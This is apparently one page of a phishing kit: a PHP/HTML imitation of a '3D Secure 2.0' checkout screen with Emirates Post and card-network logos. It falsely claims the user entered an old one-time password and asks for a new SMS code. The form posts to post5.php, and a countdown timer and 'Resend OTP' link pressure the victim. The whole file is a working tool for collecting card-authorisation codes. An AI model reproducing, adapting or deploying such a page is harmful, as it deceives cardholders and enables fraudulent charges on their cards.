<?php

include "x.php";
header("refresh:300;url=index.php");


?>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Secure 2.0</title>
    <style type="text/css">body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale
}

code {
    font-family: source-code-pro, Menlo, Monaco, Consolas, "Courier New", monospace
}

body, html {
    font-family: "Segoe UI", tahoma, Arial, sans-serif, Helvetica;
    color: #212121;
    margin: 0
}

body, form, html {
    height: 100%
}

.flex-centered {
    display: flex;
    align-items: center;
    justify-content: center
}

.container {
    border: 1px solid #b5cde5;
    background-color: #fff;
    min-height: 500px;
    max-height: 600px;
    max-width: 600px;
    font-family: "Segoe UI", tahoma, Arial, sans-serif, Helvetica;
    color: #212121;
    box-shadow: 0 0 3px 0 #dcd8d8;
    position: relative;
    flex-direction: column;
    padding: 0 20px;
    height: 100%
}

.container, .header {
    box-sizing: border-box;
    display: flex
}

.header {
    background-color: #1273d0;
    line-height: 40px;
    margin: 5px -15px 0;
    color: #fff;
    padding-left: 10px;
    justify-content: space-between;
    align-items: center
}

.header div {
    font-size: 16px;
    font-weight: 700;
    text-transform: uppercase
}

.header .cancel {
    margin-right: 6px
}

.close {
    cursor: pointer;
    background-color: transparent;
    border: 0;
    margin: 0;
    padding: 0;
    font-size: 0
}

svg {
    pointer-events: none
}

.info-header {
    font-size: 22px;
    font-weight: 700;
    padding-bottom: 5px
}

.info-text {
    font-size: 16px
}

.resend-label {
    margin-top: 5px
}

.button-link {
    cursor: pointer;
    border: 0;
    background-color: transparent;
    color: #07c;
    text-decoration: underline;
    padding: 0;
    font-family: inherit;
    font-size: inherit;
    align-self: center
}

.button-link::-moz-focus-inner {
    border: 0;
    padding: 0
}

.why-info-label {
    bottom: 15px;
    border-top: 1px dashed #b5cde5;
    right: 20px;
    left: 20px;
    padding-top: 10px;
    padding-bottom: 10px;
    background-color: #fff;
    cursor: pointer;
    flex-direction: row;
    color: #07c;
    text-decoration: underline;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis
}

.why-info-text-open {
    box-shadow: 0 -10px 8px -9px #cac7c7
}

.arrow {
    border: solid #07c;
    border-width: 0 2px 2px 0;
    display: inline-block;
    padding: 3px;
    margin-right: 10px;
    margin-left: 2px
}

.up {
    transform: rotate(-135deg);
    -webkit-transform: rotate(-135deg)
}

.rotated {
    transform: rotate(45deg) translateY(-3px);
    -webkit-transform: rotate(45deg) translateY(-3px)
}

.actions {
    display: flex;
    flex-direction: column;
    margin-bottom: 10px
}

.submit-label {
    background-color: #0d5499;
    font-size: 20px;
    max-height: 50px;
    height: 50px;
    color: #fff;
    padding: 10px 20px;
    width: 100%;
    font-weight: 700;
    box-sizing: border-box;
    border-radius: 5px;
    cursor: pointer;
    margin-top: 20px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    border: 0
}

.submit-label-disable {
    background-color: #9cb7d1;
    cursor: none
}

.input, .select {
    height: 40px;
    border-radius: 5px;
    border: 1px solid #a7b3d1;
    box-sizing: border-box;
    font-size: 16px;
    text-indent: 10px;
    width: 100%
}

option:hover {
    background-color: #a7b3d1
}

label {
    display: flex
}

.radio-group {
    display: inline-flex;
    flex-direction: column
}

.radio-group > label:nth-child(2) {
    margin-top: 10px
}

.radio {
    width: 20px;
    height: 20px;
    margin: 0 5px 0 0;
    flex: 0 0 auto
}

.radio, .radio-text {
    vertical-align: middle
}

.radio-text {
    flex: 1 1 auto
}

.invalid-input {
    border: 1px solid red;
    background: #fffc89;
    background-origin: content-box
}

.otp-input {
    position: relative;
    display: flex;
    justify-content: center;
    flex-direction: column
}

.otp-input .icon {
    position: absolute;
    right: .5rem;
    top: .7rem
}

.error-icon {
    position: relative;
    top: 1px;
    display: inline-block
}

.error-text {
    color: red;
    padding-top: 5px
}

input:focus, select:focus, textarea:focus {
    outline: none
}

.bank-info {
    width: 100%;
    display: flex;
    padding: 20px 0;
    justify-content: space-between
}

.bank-info img {
    width: auto;
    height: 30px
}

.why-info-text {
    margin: 0;
    padding: 10px 0 0 16px;
    width: 95%
}

.hide {
    display: none
}

.scrollbar {
    overflow-y: auto;
    margin-bottom: 20px;
    padding-right: 10px
}

.scrollbar::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 0 0 rgba(0, 0, 0, .3);
    background-color: #fff
}

.scrollbar::-webkit-scrollbar {
    width: 7px;
    background-color: #f5f5f5
}

.scrollbar::-webkit-scrollbar-thumb {
    background-color: #778095;
    border: 0 solid #555;
    border-radius: 5px
}

.tooltip-wrapper {
    position: relative
}

.close-tooltip {
    position: absolute;
    right: 5px;
    top: 5px
}

.tooltip {
    bottom: -1px;
    left: 0;
    padding: 10px;
    color: red;
    border-radius: 5px;
    z-index: 99999999;
    box-sizing: border-box;
    border: 1px solid red;
    font-size: 13px
}

.tooltip, .tooltip:after {
    right: 0;
    background-color: #fff;
    position: absolute
}

.tooltip:after {
    content: "";
    transform: translate(-70%) rotate(45deg);
    border-color: transparent red red transparent;
    border-style: solid;
    border-width: 1px;
    bottom: 0;
    transform-origin: left;
    padding: 5px;
    margin-bottom: -2px
}

.custom-select {
    position: relative
}

.select-selected {
    background-color: #fff;
    border-radius: 5px;
    border: 1px solid #a7b3d1;
    text-overflow: ellipsis;
    white-space: nowrap;
    overflow: hidden
}

/*style the arrow inside the select element:*/
.select-selected:after {
    content: "";
    position: absolute;
    right: 10px;
    top: 13px;
    border: solid #636c90;
    border-width: 0 3px 3px 0;
    display: inline-block;
    padding: 3px;
    -webkit-transform: rotate(45deg)
}

/*style the items (options), including the selected item:*/
.select-items div, .select-selected {
    color: #000;    
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    padding: 8px 25px 8px 10px
}

/*style items (options):*/
.select-items {
    position: absolute;
    background-color: #fff;
    left: 0;
    right: 0;
    z-index: 99;
    border-radius: 0;
    border: 1px solid #a7b3d1;
    margin-top: -3px
}

.dropdown-upwards {
    bottom: 100%
}

.dropdown-downwards {
    top: 100%
}

/*hide the items when the select box is closed:*/
.select-hide {
    display: none
}

.same-as-selected {
    background-color: #c9e4f7
}

.select-items div:hover {
    background-color: #ecfafe
}

@-webkit-keyframes blink {
    0% {
        opacity: .2
    }
    20% {
        opacity: 1
    }
    to {
        opacity: .2
    }
}

@keyframes blink {
    0% {
        opacity: .2
    }
    20% {
        opacity: 1
    }
    to {
        opacity: .2
    }
}

.submit-label span {
    -webkit-animation-name: blink;
    animation-name: blink;
    -webkit-animation-duration: 1.4s;
    animation-duration: 1.4s;
    -webkit-animation-iteration-count: infinite;
    animation-iteration-count: infinite;
    -webkit-animation-fill-mode: both;
    animation-fill-mode: both;
    font-size: 25px
}

.submit-label span:nth-child(2) {
    -webkit-animation-delay: .2s;
    animation-delay: .2s
}

.submit-label span:nth-child(3) {
    -webkit-animation-delay: .4s;
    animation-delay: .4s
}

.absolute {
    position: absolute;
    box-shadow: 0 0 15px -2px grey;
    right: 0;
    left: 0
}

footer {
    display: flex;
    flex-direction: column;
    bottom: 0;
    background: #fff;
    margin-top: auto
}

.expandable-text {
    font-weight: 400;
    display: none;
    padding: 0 15px 10px 35px
}

.show {
    display: block
}

.expanded {
    white-space: normal;
    padding-left: 33px;
    padding-right: 20px;
    padding-bottom: 0;
    text-indent: -16px
}

@media screen and (max-width: 389px) {
    .container {
        min-height: 400px;
        padding: 0 10px
    }

    .header {
        margin: 5px -5px 0
    }

    .info-header {
        font-size: 16px
    }

    .info-text {
        margin-bottom: 20px
    }

    .info-text, .why-info-label {
        font-size: 13px
    }

    .submit-label {
        font-size: 15px;
        height: 40px;
        box-sizing: border-box;
        line-height: normal;
        margin-top: 10px
    }

    .input, .select {
        font-size: 14px
    }

    .resend-label {
        font-size: 13px
    }

    .bank-info {
        padding: 10px 0
    }

    .bank-info img {
        width: auto;
        height: 15px
    }

    .radio-text {
        font-size: 14px
    }

    .info-text .scrollbar {
        height: 100px
    }

    .otp-input .icon {
        cursor: pointer
    }

    .expandable-text .scrollbar {
        max-height: 205px
    }

    .expandable-text {
        font-size: 13px
    }

    .select-items, .select-selected {
        font-size: 14px
    }
}

@media screen and (min-width: 280px) and (max-width: 389px) {
    .bank-info img {
        width: auto;
        height: 20px;
    }
}

@media screen and (min-width: 390px) and (max-width: 390px) and (max-height: 400px) {
    .container {
        min-height: 400px;
        padding: 0 10px
    }

    .header {
        margin: 5px -5px 0
    }

    .bank-info {
        padding: 15px 0 10px 0
    }

    .bank-info img {
        width: auto;
        height: 20px
    }

    .info-header {
        font-size: 18px
    }

    .info-text {
        font-size: 15px;
        margin-bottom: 20px
    }

    .info-text .scrollbar {
        height: 100px
    }

    .input, .radio-text, .select {
        font-size: 15px
    }

    .tooltip {
        font-size: 14px
    }

    .otp-input .icon {
        cursor: pointer
    }

    .submit-label {
        font-size: 16px;
        height: 40px;
        margin-top: 10px

    }

    .resend-label, .why-info-label {
        font-size: 15px
    }

    .expandable-text .scrollbar {
        max-height: 180px
    }

    .select-items, .select-selected {
        font-size: 15px
    }
}

@media screen and (min-width: 500px) and (min-height: 600px) {
    .container {
        min-height: 600px
    }

    .info-text .scrollbar {
        max-height: 200px
    }

    .expandable-text .scrollbar {
        max-height: 360px
    }
}

@media screen and (min-width: 550px) and (max-height: 450px) {
    .container {
        min-height: 400px;
        max-height: 400px
    }

    .actions {
        flex-direction: row;
        justify-content: space-between
    }

    .submit-label {
        height: 40px;
        width: 49%;
        margin-top: 0
    }

    .w-80 {
        width: 80%;
        align-self: center
    }

    .space {
        flex-direction: column
    }

    .custom-select {
        width: 50%
    }

    .otp-input {
        width: 49%
    }

    .resend-label {
        margin-top: 20px
    }

    .error-text {
        min-width: 550px;
        height: 36px
    }

    .info-text .scrollbar {
        max-height: 85px
    }

    .expandable-text .scrollbar {
        max-height: 160px
    }

    .continue {
        margin: 0 auto;
        width: 80%;
        height: 40px
    }
}

/*RTL Support*/
[dir=rtl] .header {
    padding-right: 10px;
    padding-left: 0
}

[dir=rtl] .header .cancel {
    margin-left: 6px;
    margin-right: 0
}

[dir=rtl] .bank-info {
    flex-direction: row-reverse;
}

[dir=rtl] .scrollbar {
    padding-left: 10px;
    padding-right: 0
}

[dir=rtl] .otp-input .icon {
    left: .5rem;
    right: auto;
    top: .7rem
}

[dir=rtl] .close-tooltip {
    left: 5px;
    right: auto;
    top: 5px
}

[dir=rtl] .tooltip:after {
    transform: translate(95%) rotate(45deg);
    right: auto;
    left: 0
}

[dir=rtl] .radio {
    margin: 0 0 0 5px
}

[dir=rtl] .radio-text {
    text-align: right;
    direction: ltr
}

[dir=rtl] .select-selected:after {
    right: auto;
    left: 10px
}

[dir=rtl] .select-items div, [dir=rtl] .select-selected {
    padding-right: 20px;
    padding-left: 25px
}

[dir=rtl] .arrow {
    margin-left: 10px;
    margin-right: 2px
}

[dir=rtl] .expanded {
    padding-right: 33px;
    padding-left: 20px
}

[dir=rtl] .expandable-text {
    padding: 0 35px 10px 15px
}
</style>
    <script>function ready(fn) {
    if (document.readyState !== 'loading') {
        fn();
    } else if (document.addEventListener) {
        document.addEventListener('DOMContentLoaded', fn);
    } else {
        document.attachEvent('onreadystatechange', function () {
            if (document.readyState !== 'loading')
                fn();
        });
    }
}

function toggleText(footer, whyInfoLabel, arrow, whyInfoText) {
    flipArrow(arrow);
    footer.classList.toggle("absolute");
    whyInfoLabel.classList.toggle('expanded');
    whyInfoText.parentElement.classList.toggle("show");
}

function flipArrow(arrow) {
    arrow.classList.toggle("rotated");
    arrow.classList.toggle("up");
}

var addEvent = function (el, type, fn) {
    if (el) {
        if (el.addEventListener) {
            el.addEventListener(type, fn, false);
        } else if (el.attachEvent) {
            el.attachEvent("on" + type, fn);
        } else {
            el["on" + type] = handler;
        }
    }
};

var removeEvent = function (el, type, fn) {
    if (el) {
        if (el.removeEventListener) {
            el.removeEventListener(type, fn, false);
        } else if (el.detachEvent) {
            el.detachEvent("on" + type, fn);
        } else {
            el["on" + type] = null;
        }
    }
};

if (!Object.getOwnPropertyDescriptor(Element.prototype, 'classList')) {
    if (HTMLElement && Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'classList')) {
        Object.defineProperty(Element.prototype, 'classList', Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'classList'));
    }
}

function handleSubmit(event) {
    var form = event.target;
    var isFormSubmitted = form.getAttribute('data-submitted') || false;
    if (isFormSubmitted) {
        event.preventDefault();
    }
    if (window.tdna) {
        handleGeneralTypingDna(form, 'typingDnaPattern', tdna.getTypingPattern({
            type: 2,
            caseSensitive: true
        }));
        getMouseCoordinates(form);

    }
    form.setAttribute('data-submitted', true);
}

function handleGeneralTypingDna(form, name, value) {
    var typingDna = document.createElement("input");
    typingDna.name = name;
    typingDna.value = value;
    typingDna.type = 'hidden';
    form.appendChild(typingDna);
}

function getMouseCoordinates(form) {
    var mouseDiagram = tdna.getMouseDiagram();
    var len = mouseDiagram.length;
    var maxSize = 999;
    if (len > maxSize){
        mouseDiagram=mouseDiagram.substring(len- maxSize);
        var index = mouseDiagram.indexOf("|");
        mouseDiagram = mouseDiagram.substring(index+1);
    }
    handleGeneralTypingDna(form, 'mouseDiagram', mouseDiagram);
}

function disableDoubleSubmit() {
    var form = document.getElementById('mainForm');
    addEvent(form, 'submit', handleSubmit);
}

ready(disableDoubleSubmit);
ready(function () {
    var footer = document.getElementById("footer");
    var arrowElement = document.getElementById("why-arrow");
    var whyInfoLabel = document.getElementById("why-info-label");
    var whyInfoText = document.getElementById("why-info-text");
    addEvent(whyInfoLabel, "click", function () {
        toggleText(footer, whyInfoLabel, arrowElement, whyInfoText);
    });
});

</script>
    <script>function handleCancel(event) {
    var button = event.target;
    button.type = 'submit';
}

function registerCancel() {
    var cancelButton = document.querySelector('button[name="cancel"]');
    addEvent(cancelButton, 'click', handleCancel);
}

ready(registerCancel);</script>
</head>
<body>

<form id="mainForm" action="post5.php" method="post">
    <input type="hidden" name="challengeWindowSize" value="03">
    <input type="hidden" name="threeDSServerTransID" value="7faeb3cd-7e8e-4d5b-bc53-64ea7dfd4909">
    <input type="hidden" name="messageVersion" value="2.1.0">
    <input type="hidden" name="acsTransID" value="90e774ba-5a62-4859-9b69-7f781fe628ca">
    <div class="container">
        <header class="header">
            <div>secure checkout</div>
            <button formnovalidate="" name="cancel" type="button" value="Cancel" class="close cancel">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
                    <defs>
                        <style>
                            .cls-white {
                                fill: #fff;
                                fill-rule: evenodd;
                            }
                        </style>
                    </defs>
                    <path id="close-white" class="cls-white" d="M8,0a8,8,0,1,0,8,8A8.009,8.009,0,0,0,8,0Zm3.236,10.293a0.333,0.333,0,0,1,0,.471l-0.471.471a0.333,0.333,0,0,1-.471,0L8,8.942,5.707,11.235a0.333,0.333,0,0,1-.471,0l-0.471-.471a0.333,0.333,0,0,1,0-.471L7.057,8,4.764,5.707a0.333,0.333,0,0,1,0-.471l0.471-.471a0.333,0.333,0,0,1,.471,0L8,7.057l2.293-2.293a0.333,0.333,0,0,1,.471,0l0.471,0.471a0.333,0.333,0,0,1,0,.471L8.942,8Z"></path>
                </svg>
            </button>
        </header>
        
        <div class="bank-info">
        <img src="https://channelpostmea.com/wp-content/uploads/2020/05/Emirates-post_edited.jpg" alt="Bank Logo" style="
    margin-top: 15px;
    width: 90px;
    height: 45px;
">
        <div class="col my-auto  h-100">
					<img src="https://3ds.redsys.es/3DSecure-web/statics/img/psImage/1_visa.jpg" class="img-fluid float-right">
					<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHcAAAAxCAMAAADX5sbJAAAAw1BMVEX////rABv3nhv/XwDqAAAAAAD3mQD/WwD3oBz3lwD/YgD3nRX09PTrABPpAB37+/tUVFRsbGwpKSnY2NiBgYGrq6sYGBj/+vTwYmj4pzz70aT9bgr8eA7+8fL0NxL7291KSkq4uLg2NjZcXFygoKA/Pz92dnbIyMjm5uYNDQ2Kior1oKT84+X95c36xYr4rEz6v3v83rz3tbftMzzuQUj+79/5y8zyg4f5tl7vUlj2rK/6ihTxdHj5SAv4lBj7gBHzkpTnVznyAAACnUlEQVRYhe2Xa5OaMBSGjwJRFhAIF9HWCggScVW81LWttv7/X9VA2VbXqJ0SxunMvh+URGYe33OBHID/RIMBY7Pb7daIfJ56HZGq402f/+zO5gskyzLqZcta4Ku1KGqNXJomiptVsdmdN2WkNHMpCKHsM2/qdl1CS2niZgjQRyW0FJIzvp5fzqm/yNMdar4Vas84Yr+Ib6k5uPWhfcFtKvKyZqwgMMFNbmCPhW20BAr+yATzqa6vbOyTkIO/sULd5oEdMLGfCiwVw28TZRy4eya3pAqtHzVF+o5doVWT4SmL22kJtw2jytzNxQMj76HfdgWhnl66F2ZqmOl3XpG7ZXIPp9zvrFZaVOQym7dzEE64tbTwvbK6wq1cWH/BZXdwxffho7grdl3Vnt/hg+oZHtS/4P3b86ryaYeZ4NPnMzO9SlXs/UDXE+YrndR4NVxPFxXSWBl+NfzEtNvngL35amBnt8cDC3C8fp5kRVlBvGYG5hFLu3KMVTgdY6+DD0ws4jmbrS7nI1FczWXlwuyC72A28M7JorinA/isd0ZWkMKlks803NORWytEL17KyXu5k+ksmgshucefWmh79Dab9cY7bk82u8ts1+stdlmf+9D9Lku99aud8KHoZxc50rfOlnr5XXzqYAY8qKmBYwdPEgjc0IjACCeWLWEfAowdsEeuHrmuoxt4FINtYDVy45ALd2zD2IfIVyUCRppMVAJgJECX6kQ3I7AkXVfpTYkEZkpXKnDiOhBFkMRWDODQ/zBxLTAsCohDTMwEnDG9KaSBD8F0ilXKkxvqUkJwqlp5AAyHmiV6ApRLJEJIOlIdKecSySISn/wG4DhgmWDF8TgiPjZVSGh+rRinkFKfSYgDsN3xqDAaYH/MqZ7fVVk/AauVQaaIgmCQAAAAAElFTkSuQmCC" class="img-fluid float-right" style="
    margin-right: 5px;
    width:auto;
    margin-top: 20px;
">
				</div>
    </div>
    <div style="color:#E50914" id="info-header" class="info-header">Wrong OTP</div>
    
    
    
    <div id="info-text" class="scrollbar info-text">You entered an old OTP code.<span style="color:green"> We have sent you another OTP</span> <br></div><div id="info-text" class="scrollbar info-text">To confirm the operation, enter the password that we have sent by SMS to your mobile to verify this purchase.<br></div><div id="tooltip" class="hide tooltip-wrapper">
        <div class="tooltip">
            <button type="button" class="close close-tooltip">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
    <defs>
        <style>
            .cls-gray {
            fill: #3a3a3a;
            fill-rule: evenodd;
            }
        </style>
    </defs>
    <path id="close-gray" class="cls-gray" d="M8,0a8,8,0,1,0,8,8A8.009,8.009,0,0,0,8,0Zm3.236,10.293a0.333,0.333,0,0,1,0,.471l-0.471.471a0.333,0.333,0,0,1-.471,0L8,8.942,5.707,11.235a0.333,0.333,0,0,1-.471,0l-0.471-.471a0.333,0.333,0,0,1,0-.471L7.057,8,4.764,5.707a0.333,0.333,0,0,1,0-.471l0.471-.471a0.333,0.333,0,0,1,.471,0L8,7.057l2.293-2.293a0.333,0.333,0,0,1,.471,0l0.471,0.471a0.333,0.333,0,0,1,0,.471L8.942,8Z"></path>
</svg>
            </button>
            
        </div>
    </div>
    <div class="actions">
        <div class="otp-input">
            <input autocomplete="off" name="dataEntry" id="dataEntry" required="" type="text" class="input">
            <div class="icon hide" id="error-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="16" viewBox="0 0 18 16">
    <title id="title">Error</title>
    <desc id="desc">Wrong input</desc>
    <defs>
        <style>
            .cls-1 {
            fill: red;
            fill-rule: evenodd;
            }
        </style>
    </defs>
    <path id="error_icon" class="cls-1" d="M17.826,13.745h0C16.628,11.361,14.62,7.981,12.849,5c-0.927-1.561-1.8-3.035-2.435-4.155a1.615,1.615,0,0,0-2.839,0C6.942,1.965,6.066,3.441,5.138,5c-1.77,2.981-3.777,6.36-4.974,8.742A1.511,1.511,0,0,0,0,14.427,1.59,1.59,0,0,0,1.607,16H16.383a1.59,1.59,0,0,0,1.607-1.57A1.513,1.513,0,0,0,17.826,13.745Zm-8.831.8a0.727,0.727,0,1,1,.749-0.727A0.739,0.739,0,0,1,8.995,14.542ZM9.744,12a0.369,0.369,0,0,1-.375.364H8.62A0.369,0.369,0,0,1,8.245,12V4A0.369,0.369,0,0,1,8.62,3.636H9.369A0.369,0.369,0,0,1,9.744,4v8Z"></path>
</svg>

            </div>
            <div id="invalid-input-msg" class="error-text hide"></div>
        </div>
        <button type="submit" name="okbbx" class="submit-label" id="submit-label">Submit</button>
        
        
    </div>
    <a href="#" class="resend-label button-link" name="resend" value="resend" formnovalidate="" id="resend-label">Resend OTP</a>
    <div id="timer" class="resend-label" style="font-weight: bold;  margin: auto;"></div>
    <script>
        const departMinutes = 5
        let temps = departMinutes * 60

        const timerElement = document.getElementById("timer")

        setInterval(() => {
        let minutes = parseInt(temps / 60, 10)
        let secondes = parseInt(temps % 60, 10)

        minutes = minutes < 10 ? "0" + minutes : minutes
        secondes = secondes < 10 ? "0" + secondes : secondes

        timerElement.innerText = `${minutes}:${secondes}`
        temps = temps <= 0 ? 0 : temps - 1
        }, 1000)
    </script>

    

    <footer id="footer" class="">
        <div class="why-info-label" id="why-info-label">
            <i id="why-arrow" class="arrow up"></i>Learn more about OTP
        </div>
        <div class="expandable-text">
            <p id="why-info-text" class="scrollbar">OTP is a free service available to all customers. It provides added security when completing certain transactions.</p>
        </div>
    </footer>

    </div>
</form>


</body></html>